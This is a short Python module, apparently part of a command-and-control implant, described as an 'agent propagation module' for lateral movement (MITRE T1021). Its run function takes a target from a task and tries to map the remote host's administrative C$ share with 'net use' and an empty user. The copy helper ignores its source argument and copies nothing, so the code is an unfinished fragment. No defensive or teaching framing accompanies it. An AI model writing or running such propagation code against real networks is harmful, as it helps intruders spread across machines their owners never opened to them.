"""
Agent propagation module — lateral movement to adjacent hosts.
T1021: Remote Services
"""
from __future__ import annotations

import subprocess


def _smb_copy(target: str, src: str, dst_share: str) -> str:
    result = subprocess.run(
        ["net", "use", f"\\\\{target}\\{dst_share}", "/user:", ""],
        capture_output=True, text=True,
    )
    return result.stdout + result.stderr


def run(task: dict) -> str:
    target = task.get("target", "")
    method = task.get("method", "smb")
    if not target:
        return "no target specified"
    if method == "smb":
        return _smb_copy(target, "", "C$")
    return f"unknown method: {method}"
